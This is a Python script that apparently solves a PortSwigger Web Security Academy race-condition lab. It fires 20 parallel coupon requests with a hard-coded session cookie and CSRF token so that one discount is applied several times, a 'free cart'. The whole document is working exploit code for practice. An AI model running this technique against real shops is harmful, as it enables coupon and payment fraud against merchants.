import asyncio
import aiohttp
import time
from aiohttp import TCPConnector

# CONFIGURABLE VARIABLES
hostid = '0a99000b034d1e9c83117d7e006100d0'
cookies_session = 'gkPkvG4hppMAxrKAMADlUr8f8PpBjyuV'
csrftoken = 'YSEgDrGqlm7IYUSOb5nOV494wnyRYG5x'
payload = 'PROMO20'

# PARALLEL CONFIG
total_requests = 20  # Match Burp's 20 parallel requests
request_timeout = 3

async def true_parallel_attack():
    url = f"https://{hostid}.web-security-academy.net/cart/coupon"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded", 
        "Cookie": f"session={cookies_session}"
    }
    data = f"csrf={csrftoken}&coupon={payload}"
    
    print(f"[*] Starting TRUE PARALLEL attack at {time.ctime()}")
    print(f"[*] Strategy: {total_requests} requests fired SIMULTANEOUSLY")
    print(f"[*] This emulates Burp's 'Send requests in parallel' feature")
    print("-" * 60)
    
    success_counter = [0]
    start_time = time.time()
    
    # MAXIMUM concurrency - all requests at once
    connector = TCPConnector(limit=total_requests, keepalive_timeout=10)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        # Create ALL tasks first
        tasks = []
        for i in range(total_requests):
            task = asyncio.create_task(
                parallel_request(session, url, headers, data, i, success_counter, start_time)
            )
            tasks.append(task)
        
        # Execute ALL tasks simultaneously
        print(f"[*] Firing {total_requests} parallel requests...")
        await asyncio.gather(*tasks)
    
    print("-" * 60)
    print(f"[*] Attack completed at {time.ctime()}")
    print(f"[*] Total SUCCESS responses: {success_counter[0]}")
    
    if success_counter[0] >= 5:
        print("[+] FREE CART ACHIEVED!")
        print("[+] Multiple discounts applied in parallel")
    else:
        print(f"[-] Only {success_counter[0]} successes - remove coupon and retry")

async def parallel_request(session, url, headers, data, req_id, success_counter, start_time):
    """True parallel request - all fire at same time"""
    request_start = time.time()
    relative_start = request_start - start_time
    
    try:
        async with session.post(url, headers=headers, data=data, timeout=aiohttp.ClientTimeout(total=request_timeout)) as resp:
            body = await resp.text()
            end = time.time()
            response_time = end - request_start
            
            if "Coupon already applied" in body:
                result = "DUPLICATE"
            elif "apply coupon" in body or (resp.status == 200 and len(body) == 7171):
                result = "SUCCESS"
                success_counter[0] += 1
            else:
                result = f"OTHER_{resp.status}"
            
            print(f"[{req_id:02d}] {result} | Start:+{relative_start:.3f}s | Δ:{response_time:.3f}s")
            
    except asyncio.TimeoutError:
        print(f"[{req_id:02d}] TIMEOUT | Start:+{relative_start:.3f}s")
    except Exception as e:
        print(f"[{req_id:02d}] ERROR: {str(e)[:15]} | Start:+{relative_start:.3f}s")

if __name__ == "__main__":
    # Clear cart first (important!)
    print("[!] Make sure cart has NO discount applied before running!")
    input("Press Enter to continue...")
    asyncio.run(true_parallel_attack())
